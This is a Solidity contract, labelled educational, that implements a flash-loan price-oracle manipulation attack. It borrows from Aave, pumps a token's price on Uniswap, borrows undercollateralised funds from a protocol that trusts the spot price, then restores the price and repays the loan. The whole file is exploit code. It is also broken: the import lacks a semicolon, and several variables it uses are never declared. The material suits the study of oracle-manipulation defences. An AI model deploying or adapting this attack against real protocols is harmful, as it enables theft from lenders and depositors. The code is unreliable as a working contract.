// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {IFlashLoanReceiver} from "./interfaces/IFlashLoanReceiver.sol"

// AttackContract.sol — educational purposes only
contract OracleAttack is IFlashLoanReceiver {
    ILendingPool public aave;
    IUniswapV2Router public uniswap;
    IVulnerableProtocol public target;  // Uses spot price oracle

    function executeAttack(address token, uint256 flashAmount) external {
        // Step 1: Flash loan massive capital
        aave.flashLoan(
            address(this),
            token,
            flashAmount,
            ""
        );
    }

    // Called by Aave during flash loan
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        
        // Step 2: Manipulate price on DEX
        // Buy massive amounts of targetToken (pump price)
        address[] memory path = new address[](2);
        path[0] = asset;        // USDC (borrowed)        
        path[1] = targetToken;  // ETH (buying to pump)

        uniswap.swapExactTokensForTokens(
            amount * 90 / 100, // Use 90% of flash loan
            0,
            path,
            address(this),
            block.timestamp
        );

        // Step 3: Exploit vulnerable protocol
        // It reads DEX spot price → sees inflated ETH price
        // Deposit small ETH, borrow large stable
        target.depositCollateral(smallEthAmount);
        target.borrow(hugeBorrowAmount);    //Undercollaterized at real price

        // Step 4: Restore price
        // Sell ETH back
        address[] memory reservePath = new address[](2);       
        reservePath[0] = targetToken;
        reservePath[1] = asset;

        uniswap.swapExactTokensForTokens(
            IERC20(targetToken).balanceOf(address(this)),
            0,
            reservePath,
            address(this),
            block.timestamp
        );

        // Step 5: Repay flash loan
        IERC20(asset).approve(address(aave), amount + premium);

        // hugeBorrowAmount - premium = profit
        return true;
    }
}